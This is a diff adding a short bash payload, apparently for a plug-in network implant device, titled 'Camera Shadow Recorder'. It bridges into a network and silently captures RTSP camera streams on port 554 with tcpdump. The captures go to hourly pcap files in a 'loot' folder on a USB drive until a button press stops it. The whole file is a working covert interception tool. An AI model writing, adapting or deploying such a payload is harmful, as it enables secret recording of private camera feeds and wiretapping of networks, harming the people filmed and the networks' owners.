@@ -1,0 +1,25 @@
+#!/bin/bash
+# Title:        Camera Shadow Recorder
+# Description:  Silently rips the RTSP video stream to the USB drive.
+# Net Mode:     BRIDGE
+
+function run_shadow_record() {
+    NETMODE BRIDGE
+    mkdir -p /usb/loot/video_backup &> /dev/null
+    sleep 5
+    
+    LED ATTACK
+    
+    # Filter strictly for RTSP (Real-Time Streaming Protocol) on port 554
+    # Rotates the capture file every 1 hour (3600 seconds) to prevent massive file corruption
+    tcpdump -i br-lan -s 0 tcp port 554 -G 3600 -w '/usb/loot/video_backup/camera_%Y-%m-%d_%H%M.pcap' &>/dev/null &
+    tpid=$!
+    
+    NO_LED=true BUTTON
+    kill $tpid
+    sync
+    LED G SUCCESS
+}
+
+USB_WAIT
+run_shadow_record &
